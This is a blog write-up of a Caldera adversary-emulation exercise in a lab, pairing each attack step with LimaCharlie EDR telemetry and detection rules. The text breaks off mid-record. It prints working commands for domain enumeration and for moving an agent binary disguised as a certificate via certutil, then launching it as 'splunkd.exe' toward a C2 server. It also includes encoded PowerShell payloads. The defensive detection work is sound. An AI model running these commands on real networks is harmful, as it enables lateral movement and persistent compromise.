+++
title = "[EN] Caldera Lateral Movement-Certutil Adversary Emulation"
date = "2025-10-02T16:32:09+02:00"
tags = ["soc", "caldera", "limacharlie", "mitre", "edr"]
categories = ["SOC"]
author = "Soner Sahin"
image = "/images/calderacertutil/cover.png"
+++ 


Hi everyone, in this article I will perform an attack scenario using Caldera and show you its effects on victim machines using LimaCharlie as EDR.

I will use an adversary template called **Lateral Movement - Certutil** in Caldera which consists of three steps shown below.

**Step 1:** Local FQDN

```
Description: Uses Windows libraries to get the FQDN of the infected host
Tactic: Discovery
Technique Name: Host Discovery
Technique ID: TA0007
```
**Command:** 
```powershell
[System.Net.Dns]::GetHostByName($env:computerName).HostName
```

**Step 2:** Discover local hosts
```
Description: Use PowerView to query the Active Directory server for a list of computers in the Domain
Tactic: discovery
Technique Name: Remote System Discovery
Technique ID: T1018
```

**Command:** 
```powershell
Import-Module .\powerview.ps1;
Get-DomainComputer
```

**Step 3:** Lateral Movement - Certutil
```
Description: Uses CertUtil as a LoL technique to move the .exe agent as a certificate using Windows-signed binaries
Tactic: Lateral Movement
Technique Name: Lateral Tool Transfer
Technique ID: T1570
```
**Command:** 
```powershell
certutil -encode #{location} C:\users\public\com.crt | out-null;
invoke-command #{remote.host.fqdn} -scriptblock { certutil -decode \\#{local.host.fqdn}\c$\users\public\com.crt #{location}; invoke-wmimethod -computername . -class win32_process -name Create -argumentlist "C:\users\public\splunkd.exe -server #{server} -group red" }
```


For those who don't know what **certutil.exe** is, it is a legitimate Windows command-line utility that comes built in to Windows operating systems. It is part of the Certificate Services suite and is primarily used for managing certificates and certificate authorities.

Even though **certutil.exe** is a legitimate Windows tool, it is also frequently abused by attackers for malicious purposes.

- Can download files from remote URLs (making it useful for malware delivery)
- Can encode/decode malicious payloads to evade detection
- Is signed by Microsoft, so it's often trusted by security software
- Exists on most Windows systems by default

For more details there is a great project named [**Living Off The Land Binaries, Scripts and Libraries** ](https://lolbas-project.github.io/). There you can find all of the legitimate Windows tools, detailed information—basically everything you need.

Let's get started.

Here is my lab environment:

- ad-dc 10.1.1.10
- client1 10.1.2.10

In the **Operation** tab, I will create a new operation as shown in the image below.

![certutil](/images/calderacertutil/1.png)


To make things easier, I will measure the time to focus on the exact impacts.

**Timeline:**

Oct 02, 2025 @ 13:23:50 --- Oct 02, 2025 @ 13:27:30
## **Step 1: Local FQDN** 
```
Tactic: Discovery
Technique Name: Host Discovery
Technique ID: TA0007
```
**Command:** 
```powershell
powershell -Enc WwBTAHkAcwB0AGUAbQAuAE4AZQB0AC4ARABuAHMAXQA6ADoARwBlAHQASABvAHMAdABCAHkATgBhAG0AZQAoACQAZQBuAHYAOgBjAG8AbQBwAHUAdABlAHIATgBhAG0AZQApAC4ASABvAHMAdABOAGEAbQBlAA==
```

**Decoded:**
```powershell
[System.Net.Dns]::GetHostByName($env:computerName).HostName
```

**Command Output:** 
```
client1.ssnrshnn.local
```

**LimaCharlie:**

Here you can see the exact process that has been created by Caldera.

![certutil](/images/calderacertutil/2.png)

The first process that is created by Caldera has **5540** PID and **4272** PPID. 

![certutil](/images/calderacertutil/3.png)

```powershell
"event":{
"BASE_ADDRESS":140695890034688
"COMMAND_LINE":"powershell.exe -ExecutionPolicy Bypass -C "powershell -Enc WwBTAHkAcwB0AGUAbQAuAE4AZQB0AC4ARABuAHMAXQA6ADoARwBlAHQASABvAHMAdABCAHkATgBhAG0AZQAoACQAZQBuAHYAOgBjAG8AbQBwAHUAdABlAHIATgBhAG0AZQApAC4ASABvA…"
"FILE_IS_SIGNED":1
"FILE_PATH":"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"
"HASH":"9785001b0dcf755eddb8af294a373c0b87b2498660f724e76c4d53f9c217c7a3"
"MEMORY_USAGE":55050240
	"PARENT":{
		"BASE_ADDRESS":12845056
		"COMMAND_LINE":""C:\Users\Public\Client1.exe" -server http://10.1.4.40:8888 -group red "
		"FILE_IS_SIGNED":0
		"FILE_PATH":"C:\Users\Public\Client1.exe"
		"HASH":"2cd247e11809af2d9dab77b3afb7c87977871309783372a14277b719fa27f6a7"
		"MEMORY_USAGE":1306624
		"PARENT_ATOM":"a76b164d14483ef2a0016dab68de5e69"
		"PARENT_PROCESS_ID":9660
		"PROCESS_ID":4272
		"THIS_ATOM":"bbde0097323d5ef3b6dc604568de5e8c"
		"THREADS":1
		"TIMESTAMP":1759403660323
		"USER_NAME":"SSNRSHNN\goadmin"
}
"PARENT_PROCESS_ID":4272
"PROCESS_ID":5540
"THREADS":19
"USER_NAME":"SSNRSHNN\goadmin"
}
```

Then that process created a child process with **8360** PID and **5540** PPID to proceed with its job.

```powershell
"event":{
"BASE_ADDRESS":140695890034688
"COMMAND_LINE":""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -Enc WwBTAHkAcwB0AGUAbQAuAE4AZQB0AC4ARABuAHMAXQA6ADoARwBlAHQASABvAHMAdABCAHkATgBhAG0AZQAoACQAZQBuAHYAOgBjAG8AbQBwAHUAdABlAHIATgBhAG0AZQApAC4ASABvAHMAdABOAGEAbQBlAA=="
"FILE_IS_SIGNED":1
"FILE_PATH":"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"
"HASH":"9785001b0dcf755eddb8af294a373c0b87b2498660f724e76c4d53f9c217c7a3"
"MEMORY_USAGE":31219712
	"PARENT":{
		"BASE_ADDRESS":140695890034688
		"COMMAND_LINE":"powershell.exe -ExecutionPolicy Bypass -C "powershell -Enc WwBTAHkAcwB0AGUAbQAuAE4AZQB0AC4ARABuAHMAXQA6ADoARwBlAHQASABvAHMAdABCAHkATgBhAG0AZQAoACQAZQBuAHYAOgBjAG8AbQBwAHUAdABlAHIATgBhAG0AZQApAC4ASABvA…"
		"FILE_IS_SIGNED":1
		"FILE_PATH":"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"
		"HASH":"9785001b0dcf755eddb8af294a373c0b87b2498660f724e76c4d53f9c217c7a3"
		"MEMORY_USAGE":55050240
		"PARENT_ATOM":"bbde0097323d5ef3b6dc604568de5e8c"
		"PARENT_PROCESS_ID":4272
		"PROCESS_ID":5540
		"THIS_ATOM":"7af019fcf9ba0bb848cf51ac68de60ef"
		"THREADS":19
		"TIMESTAMP":1759404270750
		"USER_NAME":"SSNRSHNN\goadmin"
}
"PARENT_PROCESS_ID":5540
"PROCESS_ID":8360
"THREADS":17
"USER_NAME":"SSNRSHNN\goadmin"
}
```

**LimaCharlie Detections:**

In this section, we can catch suspicious processes through the detection rules that come by default (or you can add more). These rules work well. As you can see in the image below, multiple detection rules have been triggered for a process.

I will show you only one of them to avoid clutter. In the left section, the detection rules highlighted in blue have been triggered for the relevant Step 1 process.

![certutil](/images/calderacertutil/6.png)

**Detection rule:**

```json
"detection":{
"author":"_soteria-rules-edr-926e2197-189b-4d89-9675-c8993933dc9a[bulk][segment]"
"cat":"00014-WIN-Encoded_Powershell"
"detect":{
"event":{
"BASE_ADDRESS":140695890034688
"COMMAND_LINE":"powershell.exe -ExecutionPolicy Bypass -C "powershell -Enc WwBTAHkAcwB0AGUAbQAuAE4AZQB0AC4ARABuAHMAXQA6ADoARwBlAHQASABvAHMAdABCAHkATgBhAG0AZQAoACQAZQBuAHYAOgBjAG8AbQBwAHUAdABlAHIATgBhAG0AZQApAC4ASABvA…"
"FILE_IS_SIGNED":1
"FILE_PATH":"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"
"HASH":"9785001b0dcf755eddb8af294a373c0b87b2498660f724e76c4d53f9c217c7a3"
"MEMORY_USAGE":55050240
"PARENT":{
"BASE_ADDRESS":12845056
"COMMAND_LINE":""C:\Users\Public\Client1.exe" -server http://10.1.4.40:8888 -group red "
"FILE_IS_SIGNED":0
"FILE_PATH":"C:\Users\Public\Client1.exe"
"HASH":"2cd247e11809af2d9dab77b3afb7c87977871309783372a14277b719fa27f6a7"
"MEMORY_USAGE":1306624
"PARENT_ATOM":"a76b164d14483ef2a0016dab68de5e69"
"PARENT_PROCESS_ID":9660
"PROCESS_ID":4272
"THIS_ATOM":"bbde0097323d5ef3b6dc604568de5e8c"
"THREADS":1
"TIMESTAMP":1759403660323
"USER_NAME":"SSNRSHNN\goadmin"
}
"PARENT_PROCESS_ID":4272
"PROCESS_ID":5540
"THREADS":19
"USER_NAME":"SSNRSHNN\goadmin"
}
"routing":{
"arch":2
"did":""
"event_id":"559ada23-c46e-43ee-a673-b80cae5ce302"
"event_time":1759404270750
"event_type":"NEW_PROCESS"
"ext_ip":"79.238.92.208"
"hostname":"client1.ssnrshnn.local"
"iid":"9b03d810-e114-4352-9392-a1186feb7894"
"int_ip":"10.1.2.10"
"latency":-550
"moduleid":2
"oid":"c73795e0-a62c-4854-9462-be3d08769aa1"
"parent":"bbde0097323d5ef3b6dc604568de5e8c"
"plat":268435456
"sid":"23bf4a39-63f5-4808-8a3a-772460439fe4"
"tags":[
"windows"
]
"this":"7af019fcf9ba0bb848cf51ac68de60ef"
}
}
"detect_id":"711de844-83fb-4d11-b674-269968de60ee"
"detect_mtd":{
"description":"Powershell is a commandline interface built into the Windows operating systems for scripting and automating common system administrative tasks. Powershell includes an ability to decode and execute enc…"
"falsepositives":[
"Devops tools such as Chef, Puppet, VS Code, Node Package Manager (NPM), and Windows Subsystem for Linux (WSL) commonly leverage Powershell and base64 encoding for automation. Additional legitimate sof…"
]
"references":[
"https://unit42.paloaltonetworks.com/unit42-pulling-back-the-curtains-on-encodedcommand-powershell-attacks/"
"https://www.redcanary.com/blog/investigating-powershell-attacks/"
"https://www.symantec.com/content/dam/symantec/docs/security-center/white-papers/increased-use-of-powershell-in-attacks-16-en.pdf"
]
"tags":[
"attack.t1001"
"attack.t1027"
"attack.t1059.001"
"attack.t1132.001"
"attack.t1140"
]
}
"gen_time":1759404270275
"link":"https://app.limacharlie.io/orgs/c73795e0-a62c-4854-9462-be3d08769aa1/sensors/23bf4a39-63f5-4808-8a3a-772460439fe4/timeline?time=1759404270&selected=7af019fcf9ba0bb848cf51ac68de60ef"
"namespace":"general"
"priority":2
"rule_tags":[
"attack.t1001"
"attack.t1027"
"attack.t1059.001"
"attack.t1132.001"
"attack.t1140"
"ext:soteria-rules-edr"
]
"source":"c73795e0-a62c-4854-9462-be3d08769aa1.9b03d810-e114-4352-9392-a1186feb7894.23bf4a39-63f5-4808-8a3a-772460439fe4.10000000.2"
"source_rule":"service.WIN-Encoded_Powershell"
"ts":1759404270000
}
```

## **Step 2: Discover local hosts**
```
Tactic: Discovery
Technique Name: Remote System Discovery
Technique ID: T1018
```
**Command:** 
```powershell
powershell -Enc SQBtAHAAbwByAHQALQBNAG8AZAB1AGwAZQAgAC4AXABwAG8AdwBlAHIAdgBpAGUAdwAuAHAAcwAxADsARwBlAHQALQBEAG8AbQBhAGkAbgBDAG8AbQBwAHUAdABlAHIA
```

**Decoded:**
```
Import-Module .\powerview.ps1;Get-DomainComputer
```

**Command Output:** 
```
|remote.host.fqdn|ad-dc.ssnrshnn.local
|remote.host.fqdn|client1.ssnrshnn.local
|remote.host.fqdn|client2.ssnrshnn.local
|remote.host.fqdn|exchange.ssnrshnn.local
```

**LimaCharlie:**

Here you can see the second malicious process that has been created by Caldera as Step 2.

![certutil](/images/calderacertutil/4.png)

The process tree view is similar to Step 1.

![certutil](/images/calderacertutil/5.png)

**Parent process:**

```powershell
"event":{
"BASE_ADDRESS":140695890034688
"COMMAND_LINE":"powershell.exe -ExecutionPolicy Bypass -C "powershell -Enc WwBTAHkAcwB0AGUAbQAuAE4AZQB0AC4ARABuAHMAXQA6ADoARwBlAHQASABvAHMAdABCAHkATgBhAG0AZQAoACQAZQBuAHYAOgBjAG8AbQBwAHUAdABlAHIATgBhAG0AZQApAC4ASABvA…"
"FILE_IS_SIGNED":1
"FILE_PATH":"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"
"HASH":"9785001b0dcf755eddb8af294a373c0b87b2498660f724e76c4d53f9c217c7a3"
"MEMORY_USAGE":55050240
	"PARENT":{
		"BASE_ADDRESS":12845056
		"COMMAND_LINE":""C:\Users\Public\Client1.exe" -server http://10.1.4.40:8888 -group red "
		"FILE_IS_SIGNED":0
		"FILE_PATH":"C:\Users\Public\Client1.exe"
		"HASH":"2cd247e11809af2d9dab77b3afb7c87977871309783372a14277b719fa27f6a7"
		"MEMORY_USAGE":1306624
		"PARENT_ATOM":"a76b164d14483ef2a0016dab68de5e69"
		"PARENT_PROCESS_ID":9660
		"PROCESS_ID":4272
		"THIS_ATOM":"bbde0097323d5ef3b6dc604568de5e8c"
		"THREADS":1
		"TIMESTAMP":1759403660323
		"USER_NAME":"SSNRSHNN\goadmin"
}
"PARENT_PROCESS_ID":4272
"PROCESS_ID":5540
"THREADS":19
"USER_NAME":"SSNRSHNN\goadmin"
}
```

**Child process:**

```powershell
"event":{
"BASE_ADDRESS":140695890034688
"COMMAND_LINE":""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -Enc WwBTAHkAcwB0AGUAbQAuAE4AZQB0AC4ARABuAHMAXQA6ADoARwBlAHQASABvAHMAdABCAHkATgBhAG0AZQAoACQAZQBuAHYAOgBjAG8AbQBwAHUAdABlAHIATgBhAG0AZQApAC4…"
"FILE_IS_SIGNED":1
"FILE_PATH":"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"
"HASH":"9785001b0dcf755eddb8af294a373c0b87b2498660f724e76c4d53f9c217c7a3"
"MEMORY_USAGE":31219712
	"PARENT":{
		"BASE_ADDRESS":140695890034688
		"COMMAND_LINE":"powershell.exe -ExecutionPolicy Bypass -C "powershell -Enc WwBTAHkAcwB0AGUAbQAuAE4AZQB0AC4ARABuAHMAXQA6ADoARwBlAHQASABvAHMAdABCAHkATgBhAG0AZQAoACQAZQBuAHYAOgBjAG8AbQBwAHUAdABlAHIATgBhAG0AZQApAC4ASABvA…"
		"FILE_IS_SIGNED":1
		"FILE_PATH":"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"
		"HASH":"9785001b0dcf755eddb8af294a373c0b87b2498660f724e76c4d53f9c217c7a3"
		"MEMORY_USAGE":55050240
		"PARENT_ATOM":"bbde0097323d5ef3b6dc604568de5e8c"
		"PARENT_PROCESS_ID":4272
		"PROCESS_ID":5540
		"THIS_ATOM":"7af019fcf9ba0bb848cf51ac68de60ef"
		"THREADS":19
		"TIMESTAMP":1759404270750
		"USER_NAME":"SSNRSHNN\goadmin"
}
"PARENT_PROCESS_ID":5540
"PROCESS_ID":8360
"THREADS":17
"USER_NAME":"SSNRSHNN\goadmin"
}
```


**LimaCharlie Detection:**

![certutil](/images/calderacertutil/7.png)


```json
"detection":{
"author":"_ext-sigma-7a14fbc3-54d9-4b4d-8700-61eddada04f0[bulk][segment]"
"cat":"Change PowerShell Policies to an Insecure Level"
"detect":{
"event":{
"BASE_ADDRESS":140695890034688
"COMMAND_LINE":"powershell.exe -ExecutionPolicy Bypass -C "powershell -Enc SQBtAHAAbwByAHQALQBNAG8AZAB1AGwAZQAgAC4AXABwAG8AdwBlAHIAdgBpAGUAdwAuAHAAcwAxADsARwBlAHQALQBEAG8AbQBhAGkAbgBDAG8AbQBwAHUAdABlAHIA""
"FILE_IS_SIGNED":1
"FILE_PATH":"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"
"HASH":"9785001b0dcf755eddb8af294a373c0b87b2498660f724e76c4d53f9c217c7a3"
"MEMORY_USAGE":54919168
"PARENT":{
"BASE_ADDRESS":12845056
"COMMAND_LINE":""C:\Users\Public\Client1.exe" -server http://10.1.4.40:8888 -group red "
"FILE_IS_SIGNED":0
"FILE_PATH":"C:\Users\Public\Client1.exe"
"HASH":"2cd247e11809af2d9dab77b3afb7c87977871309783372a14277b719fa27f6a7"
"MEMORY_USAGE":1306624
"PARENT_ATOM":"a76b164d14483ef2a0016dab68de5e69"
"PARENT_PROCESS_ID":9660
"PROCESS_ID":4272
"THIS_ATOM":"bbde0097323d5ef3b6dc604568de5e8c"
"THREADS":1
"TIMESTAMP":1759403660323
"USER_NAME":"SSNRSHNN\goadmin"
}
"PARENT_PROCESS_ID":4272
"PROCESS_ID":10060
"THREADS":19
"USER_NAME":"SSNRSHNN\goadmin"
}
"routing":{
"arch":2
"did":""
"event_id":"f23d4b05-3f27-45a1-b12d-34186e3a8197"
"event_time":1759404331906
"event_type":"NEW_PROCESS"
"ext_ip":"79.238.92.208"
"hostname":"client1.ssnrshnn.local"
"iid":"9b03d810-e114-4352-9392-a1186feb7894"
"int_ip":"10.1.2.10"
"latency":-200
"moduleid":2
"oid":"c73795e0-a62c-4854-9462-be3d08769aa1"
"parent":"bbde0097323d5ef3b6dc604568de5e8c"
"plat":268435456
"sid":"23bf4a39-63f5-4808-8a3a-772460439fe4"
"tags":[
"windows"
]
"this":"838ade81151b59202d3a885468de612c"
}
}
"detect_id":"60b6fbaf-3a72-4e62-8297-076968de612b"
"detect_mtd":{
"author":"frack113"
"description":"Detects changing the PowerShell script execution policy to a potentially insecure level using the "-ExecutionPolicy" flag."
"falsepositives":[
"Administrator scripts"
]
"level":"medium"
"references":[
"https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.security/set-executionpolicy?view=powershell-7.4"
"https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_execution_policies?view=powershell-7.4"
"https://adsecurity.org/?p=2604"
"https://thedfirreport.com/2021/11/01/from-zero-to-domain-admin/"
]
"tags":[
"attack.execution"
"attack.t1059.001"
]
}
"gen_time":1759404331754
"link":"https://app.limacharlie.io/orgs/c73795e0-a62c-4854-9462-be3d08769aa1/sensors/23bf4a39-63f5-4808-8a3a-772460439fe4/timeline?time=1759404331&selected=838ade81151b59202d3a885468de612c"
"namespace":"general"
"rule_tags":[
"ext:ext-sigma"
"attack.execution"
"attack.t1059.001"
]
"source":"c73795e0-a62c-4854-9462-be3d08769aa1.9b03d810-e114-4352-9392-a1186feb7894.23bf4a39-63f5-4808-8a3a-772460439fe4.10000000.2"
"source_rule":"service.windows_process_creation/proc_creation_win_powershell_set_policies_to_unsecure_level"
"ts":1759404331000
}
```


## **Step 3: Lateral Movement - Certutil**
```
Tactic: Lateral Movement
Technique Name: Lateral Tool Transfer
Technique ID: T1570
```
```powershell
powershell -Enc YwBlAHIAdAB1AHQAaQBsACAALQBlAG4AYwBvAGQAZQAgAEMAOgBcAFUAcwBlAHIAcwBcAFAAdQBiAGwAaQBjAFwAQwBsAGkAZQBuAHQAMQAuAGUAeABlACAAQwA6AFwAdQBzAGUAcgBzAFwAcAB1AGIAbABpAGMAXABjAG8AbQAuAGMAcgB0ACAAfAAgAG8AdQB0AC0AbgB1AGwAbAA7AGkAbgB2AG8AawBlAC0AYwBvAG0AbQBhAG4AZAAgAGEAZAAtAGQAYwAuAHMAcwBuAHIAcwBoAG4AbgAuAGwAbwBjAGEAbAAgAC0AcwBjAHIAaQBwAHQAYgBsAG8AYwBrACAAewAgAGMAZQByAHQAdQB0AGkAbAAgAC0AZABlAGMAbwBkAGUAIABcAFwAYwBsAGkAZQBuAHQAMQAuAHMAcwBuAHIAcwBoAG4AbgAuAGwAbwBjAGEAbABcAGMAJABcAHUAcwBlAHIAcwBcAHAAdQBiAGwAaQBjAFwAYwBvAG0ALgBjAHIAdAAgAEMAOgBcAFUAcwBlAHIAcwBcAFAAdQBiAGwAaQBjAFwAQwBsAGkAZQBuAHQAMQAuAGUAeABlADsAIABpAG4AdgBvAGsAZQAtAHcAbQBpAG0AZQB0AGgAbwBkACAALQBjAG8AbQBwAHUAdABlAHIAbgBhAG0AZQAgAC4AIAAtAGMAbABhAHMAcwAgAHcAaQBuADMAMgBfAHAAcgBvAGMAZQBzAHMAIAAtAG4AYQBtAGUAIABDAHIAZQBhAHQAZQAgAC0AYQByAGcAdQBtAGUAbgB0AGwAaQBzAHQAIAAiAEMAOgBcAHUAcwBlAHIAcwBcAHAAdQBiAGwAaQBjAFwAcwBwAGwAdQBuAGsAZAAuAGUAeABlACAALQBzAGUAcgB2AGUAcgAgAGgAdAB0AHAAOgAvAC8AMQAwAC4AMQAuADQALgA0ADAAOgA4ADgAOAA4ACAALQBnAHIAbwB1AHAAIAByAGUAZAAiACAAfQA=
```

**Decoded:**
```
certutil -encode #{location} C:\users\public\com.crt | out-null;
invoke-command #{remote.host.fqdn} -scriptblock { certutil -decode \\#{local.host.fqdn}\c$\users\public\com.crt #{location}; invoke-wmimethod -computername . -class win32_process -name Create -argumentlist "C:\users\public\splunkd.exe -server #{server} -group red" }
```

**Command Output:** 
```
Input Length = 8778940
Output Length = 6384640
CertUtil: -decode command completed successfully.


PSComputerName   : ad-dc.ssnrshnn.local
RunspaceId       : 841b23d1-7ece-4772-8897-bf2ab067596e
__GENUS          : 2
__CLASS          : __PARAMETERS
__SUPERCLASS     : 
__DYNASTY        : __PARAMETERS
__RELPATH        : 
__PROPERTY_COUNT : 2
__DERIVATION     : {}
__SERVER         : 
__NAMESPACE      : 
__PATH           : 
ProcessId        : 
ReturnValue      : 9
```

The attacker's aim here is to transfer and execute malware across systems in a network.

**Attack Flow:**

**Step 1: Encoding the malware**

```
certutil -encode C:\Users\Public\Client1.exe C:\users\public\com.crt
```

- Takes an executable (`Client1.exe`) and encodes it to Base64
- Saves it as `com.crt` (disguised as a certificate file to avoid detection)

![certutil](/images/calderacertutil/10.1.png)

![certutil](/images/calderacertutil/10.2.png)


![certutil](/images/calderacertutil/10.png)

**Step 2: Remote execution on the Domain Controller**

```
invoke-command ad-dc.ssnrshnn.local -scriptblock { ... }
```

- Executes commands remotely on the domain controller (`ad-dc.ssnrshnn.local`)
- This requires administrative privileges

![certutil](/images/calderacertutil/13.png)


![certutil](/images/calderacertutil/14.png)


**Step 3: Decoding on the target**

```
certutil -decode \\client1.ssnrshnn.local\c$\users\public\com.crt C:\Users\Public\Client1.exe
```

- Accesses the encoded file via network share from client1
- Decodes it back to an executable on the domain controller

**ad-dc** 

![certutil](/images/calderacertutil/11.png)

Process tree view:

![certutil](/images/calderacertutil/12.png)


![certutil](/images/calderacertutil/15.png)

Detections:

![certutil](/images/calderacertutil/16.png)


**Step 4: Executing the payload**

```
invoke-wmimethod -computername . -class win32_process -name Create -argumentlist "C:\users\public\splunkd.exe..."
```

- Uses WMI to spawn a new process (disguised as `splunkd.exe` - mimicking Splunk's legitimate process)


**LimaCharlie:**

Here you can see the third malicious process that has been created by Caldera as Step 3.

![certutil](/images/calderacertutil/8.png)

In the process tree view we can see that this process looks a bit different than the former ones.

![certutil](/images/calderacertutil/9.png)

Parent process:

```powershell
"event":{
"BASE_ADDRESS":140695890034688
"COMMAND_LINE":"powershell.exe -ExecutionPolicy Bypass -C "powershell -Enc YwBlAHIAdAB1AHQAaQBsACAALQBlAG4AYwBvAGQAZQAgAEMAOgBcAFUAcwBlAHIAcwBcAFAAdQBiAGwAaQBjAFwAQwBsAGkAZQBuAHQAMQAuAGUAeABlACAAQwA6AFwAdQBzAGUAcgBzA…"
"FILE_IS_SIGNED":1
"FILE_PATH":"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"
"HASH":"9785001b0dcf755eddb8af294a373c0b87b2498660f724e76c4d53f9c217c7a3"
"MEMORY_USAGE":54931456
"PARENT":{
"BASE_ADDRESS":12845056
"COMMAND_LINE":""C:\Users\Public\Client1.exe" -server http://10.1.4.40:8888 -group red "
"FILE_IS_SIGNED":0
"FILE_PATH":"C:\Users\Public\Client1.exe"
"HASH":"2cd247e11809af2d9dab77b3afb7c87977871309783372a14277b719fa27f6a7"
"MEMORY_USAGE":1306624
"PARENT_ATOM":"a76b164d14483ef2a0016dab68de5e69"
"PARENT_PROCESS_ID":9660
"PROCESS_ID":4272
"THIS_ATOM":"bbde0097323d5ef3b6dc604568de5e8c"
"THREADS":1
"TIMESTAMP":1759403660323
"USER_NAME":"SSNRSHNN\goadmin"
}
"PARENT_PROCESS_ID":4272
"PROCESS_ID":6016
"THREADS":19
"USER_NAME":"SSNRSHNN\goadmin"
}
```

Child process:

```powershell
"event":{
"BASE_ADDRESS":140695890034688
"COMMAND_LINE":""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -Enc YwBlAHIAdAB1AHQAaQBsACAALQBlAG4AYwBvAGQAZQAgAEMAOgBcAFUAcwBlAHIAcwBcAFAAdQBiAGwAaQBjAFwAQwBsAGkAZQBuAHQAMQAuAGUAeABlACAAQwA6AFwAdQBzAGU…"
"FILE_IS_SIGNED":1
"FILE_PATH":"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"
"HASH":"9785001b0dcf755eddb8af294a373c0b87b2498660f724e76c4d53f9c217c7a3"
"MEMORY_USAGE":61292544
"PARENT":{
"BASE_ADDRESS":140695890034688
"COMMAND_LINE":"powershell.exe -ExecutionPolicy Bypass -C "powershell -Enc YwBlAHIAdAB1AHQAaQBsACAALQBlAG4AYwBvAGQAZQAgAEMAOgBcAFUAcwBlAHIAcwBcAFAAdQBiAGwAaQBjAFwAQwBsAGkAZQBuAHQAMQAuAGUAeABlACAAQwA6AFwAdQBzAGUAcgBzA…"
"FILE_IS_SIGNED":1
"FILE_PATH":"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"
"HASH":"9785001b0dcf755eddb8af294a373c0b87b2498660f724e76c4d53f9c217c7a3"
"MEMORY_USAGE":54931456
"PARENT_ATOM":"bbde0097323d5ef3b6dc604568de5e8c"
"PARENT_PROCESS_ID":4272
"PROCESS_ID":6016
"THIS_ATOM":"f1172e538d9a0937687748e868de6194"
"THREADS":19
"TIMESTAMP":1759404435957
"USER_NAME":"SSNRSHNN\goadmin"
}
"PARENT_PROCESS_ID":6016
"PROCESS_ID":5276
"THREADS":19
"USER_NAME":"SSNRSHNN\goadmin"
}
```


Child process: **certutil.exe**

```powershell
"event":{
"COMMAND_LINE":""C:\Windows\system32\certutil.exe" -encode C:\Users\Public\Client1.exe C:\users\public\com.crt"
"FILE_IS_SIGNED":1
"FILE_PATH":"C:\Windows\system32\certutil.exe"
"HASH":"fd1670b43e2d9188b12b233780bf043c5a90a67a2c6e3fcdc564a5c246531bc2"
"MEMORY_USAGE":20480
"PARENT":{
"BASE_ADDRESS":140695890034688
"COMMAND_LINE":""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -Enc YwBlAHIAdAB1AHQAaQBsACAALQBlAG4AYwBvAGQAZQAgAEMAOgBcAFUAcwBlAHIAcwBcAFAAdQBiAGwAaQBjAFwAQwBsAGkAZQBuAHQAMQAuAGUAeABlACAAQwA6AFwAdQBzAGU…"
"FILE_IS_SIGNED":1
"FILE_PATH":"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"
"HASH":"9785001b0dcf755eddb8af294a373c0b87b2498660f724e76c4d53f9c217c7a3"
"MEMORY_USAGE":61292544
"PARENT_ATOM":"f1172e538d9a0937687748e868de6194"
"PARENT_PROCESS_ID":6016
"PROCESS_ID":5276
"THIS_ATOM":"c999c6c3bfd3c25eb4d5502968de6194"
"THREADS":19
"TIMESTAMP":1759404436097
"USER_NAME":"SSNRSHNN\goadmin"
}
"PARENT_PROCESS_ID":5276
"PROCESS_ID":1740
"USER_NAME":"SSNRSHNN\goadmin"
}
```

Child process: **Network Connections**

```powershell
"event":{
"COMMAND_LINE":""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -Enc YwBlAHIAdAB1AHQAaQBsACAALQBlAG4AYwBvAGQAZQAgAEMAOgBcAFUAcwBlAHIAcwBcAFAAdQBiAGwAaQBjAFwAQwBsAGkAZQBuAHQAMQAuAGUAeABlACAAQwA6AFwAdQBzAGUAcgBzAFwAcAB1AGIAbABpAGMAXABjAG8AbQAuAGMAcgB0ACAAfAAgAG8AdQB0AC0AbgB1AGwAbAA7AGkAbgB2AG8AawBlAC0AYwBvAG0AbQBhAG4AZAAgAGMAbABpAGUAbgB0ADIALgBzAHMAbgByAHMAaABuAG4ALgBsAG8AYwBhAGwAIAAtAHMAYwByAGkAcAB0AGIAbABvAGMAawAgAHsAIABjAGUAcgB0AHUAdABpAGwAIAAtAGQAZQBjAG8AZABlACAAXABcAGMAbABpAGUAbgB0ADEALgBzAHMAbgByAHMAaABuAG4ALgBsAG8AYwBhAGwAXABjACQAXAB1AHMAZQByAHMAXABwAHUAYgBsAGkAYwBcAGMAbwBtAC4AYwByAHQAIABDADoAXABVAHMAZQByAHMAXABQAHUAYgBsAGkAYwBcAEMAbABpAGUAbgB0ADEALgBlAHgAZQA7ACAAaQBuAHYAbwBrAGUALQB3AG0AaQBtAGUAdABoAG8AZAAgAC0AYwBvAG0AcAB1AHQAZQByAG4AYQBtAGUAIAAuACAALQBjAGwAYQBzAHMAIAB3AGkAbgAzADIAXwBwAHIAbwBjAGUAcwBzACAALQBuAGEAbQBlACAAQwByAGUAYQB0AGUAIAAtAGEAcgBnAHUAbQBlAG4AdABsAGkAcwB0ACAAIgBDADoAXAB1AHMAZQByAHMAXABwAHUAYgBsAGkAYwBcAHMAcABsAHUAbgBrAGQALgBlAHgAZQAgAC0AcwBlAHIAdgBlAHIAIABoAHQAdABwADoALwAvADEAMAAuADEALgA0AC4ANAAwADoAOAA4ADgAOAAgAC0AZwByAG8AdQBwACAAcgBlAGQAIgAgAH0A"
"FILE_IS_SIGNED":1
"FILE_PATH":"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"
"HASH":"9785001b0dcf755eddb8af294a373c0b87b2498660f724e76c4d53f9c217c7a3"
"NETWORK_ACTIVITY":[
{
"DESTINATION":{
"IP_ADDRESS":"10.1.2.20"
"PORT":5985
}
"IS_OUTGOING":1
"PROTOCOL":"tcp4"
"SOURCE":{
"IP_ADDRESS":"10.1.2.10"
"PORT":50079
}
"TIMESTAMP":1759404436488
}
{
